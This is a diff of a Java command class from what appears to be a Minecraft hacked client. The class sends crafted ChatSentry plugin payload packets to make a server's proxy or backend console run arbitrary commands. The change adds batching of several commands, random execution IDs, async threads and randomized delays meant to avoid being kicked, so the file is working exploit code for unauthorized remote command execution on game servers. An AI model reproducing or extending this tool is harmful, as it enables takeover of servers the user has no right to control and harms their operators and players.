@@ -5,64 +5,73 @@ import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import io.github.spigotrce.paradiseclientfabric.Helper;
 import io.github.spigotrce.paradiseclientfabric.command.Command;
 import io.github.spigotrce.paradiseclientfabric.packet.ChatSentryPayloadPacket;
-import net.minecraft.client.MinecraftClient;
 import net.minecraft.command.CommandSource;
 import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
 
 import java.util.Random;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
 public class ChatSentryCommand extends Command {
+    private final ExecutorService executor = Executors.newCachedThreadPool();
+
     public ChatSentryCommand() {
-        super("chatsentry", "Executes bungee command through console!");
+        super("chatsentry", "Executes ChatSentry payloads (bungee/backend) with auto execution, random ID, and async support");
     }
 
     @Override
     public void build(LiteralArgumentBuilder<CommandSource> root) {
         root.executes(context -> {
-                    Helper.printChatMessage("Incomplete command!");
+                    Helper.printChatMessage("Usage: .chatsentry <bungee/backend> <command>");
                     return SINGLE_SUCCESS;
                 })
                 .then(literal("bungee")
                         .then(argument("command", StringArgumentType.greedyString())
                                 .executes(context -> {
+                                    String cmd = context.getArgument("command", String.class);
                                     Helper.sendPacket(new CustomPayloadC2SPacket(
-                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), true, "", "")
+                                            new ChatSentryPayloadPacket(cmd, true, "", "")
                                     ));
-                                    Helper.printChatMessage("Chat sentry bungee payload packet sent!");
+                                    Helper.printChatMessage("§a[ChatSentry] §fBungee payload sent: §e" + cmd);
                                     return SINGLE_SUCCESS;
                                 })
                         ))
                 .then(literal("backend")
-                        .executes(context -> {
-                            Helper.printChatMessage("Incomplete command!");
-                            return SINGLE_SUCCESS;
-                        })
                         .then(argument("command", StringArgumentType.greedyString())
                                 .executes(context -> {
-                                    String command = context.getArgument("command", String.class);
-                                    new Thread(() -> sendAutoExecution(command)).start();
+                                    String cmd = context.getArgument("command", String.class);
+                                    executor.execute(() -> sendAutoExecution(cmd));
                                     return SINGLE_SUCCESS;
                                 })
-                        )
-                );
-
+                        ));
     }
 
     private void sendAutoExecution(String command) {
-        String s = Helper.generateRandomString(4, "iahosd6as5d9oayhdstdou", new Random());
-        Helper.sendPacket(new CustomPayloadC2SPacket(
-                new ChatSentryPayloadPacket(command, false, "config", s)
-        ));
+        String[] cmds = command.split(";");
+        for (String cmd : cmds) {
+            cmd = cmd.trim();
+            if (cmd.isEmpty()) continue;
 
-        Helper.sendPacket(new CustomPayloadC2SPacket(
-                new ChatSentryPayloadPacket(command, false, "module", s)
-        ));
-        Helper.printChatMessage("Chat sentry backend payload packet sent! Sending execution message: " + s);
-        try {
-            Thread.sleep(100);
-        } catch (InterruptedException e) {
-            Helper.printChatMessage("Unable to sleep for message, send in chat: " + s);
+            String execId = Helper.generateRandomString(6, "abcdefghijklmnopqrstuvwxyz0123456789", new Random());
+
+            Helper.sendPacket(new CustomPayloadC2SPacket(
+                    new ChatSentryPayloadPacket(cmd, false, "config", execId)
+            ));
+
+            Helper.sendPacket(new CustomPayloadC2SPacket(
+                    new ChatSentryPayloadPacket(cmd, false, "module", execId)
+            ));
+
+            Helper.printChatMessage("§a[ChatSentry] §fPayload sent for command: §b" + cmd + " §7[ID: " + execId + "]");
+
+            try {
+                TimeUnit.MILLISECONDS.sleep(150 + new Random().nextInt(100)); // Delay to prevent anti-kick
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+            }
+
+            getMinecraftClient().getNetworkHandler().sendChatMessage(execId);
         }
-        getMinecraftClient().getNetworkHandler().sendChatMessage(s);
     }
 }
